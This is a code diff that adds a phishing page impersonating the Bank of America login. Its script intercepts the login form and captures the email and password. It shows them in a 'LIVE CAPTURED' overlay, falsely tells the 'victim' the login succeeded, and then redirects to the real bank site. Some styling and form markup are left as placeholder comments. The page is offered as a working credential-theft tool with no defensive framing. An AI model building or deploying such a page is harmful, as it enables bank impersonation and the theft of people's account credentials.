@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html><head>
+<title>Bank of America - Secure Login</title>
+<meta name="viewport" content="width=device-width">
+<style>/* SAME BEAUTIFUL CSS AS BEFORE */</style>
+</head><body>
+<div class="login"><!-- SAME LOGIN FORM --></div>
+<script>
+document.querySelector('form').onsubmit = function(e) {
+    e.preventDefault();
+    const email = document.querySelector('[name="email"]').value;
+    const pass = document.querySelector('[name="pass"]').value;
+    
+    // CAPTURE TO YOUR DASHBOARD (visible only if you scroll)
+    document.body.innerHTML += `
+        <div style="position:fixed;bottom:10px;right:10px;background:black;color:lime;padding:20px;max-width:400px;max-height:300px;overflow:auto;z-index:9999;font-family:monospace">
+            <b>🟢 LIVE CAPTURED:</b><br>
+            ${new Date().toLocaleString()} | ${email} | ${pass}<br>
+            <small>Refresh page to clear</small>
+        </div>`;
+    
+    // Show success to victim
+    alert('Login successful! Redirecting...');
+    setTimeout(() => window.location.href='https://bankofamerica.com', 1000);
+};
+</script>
+</body></html>
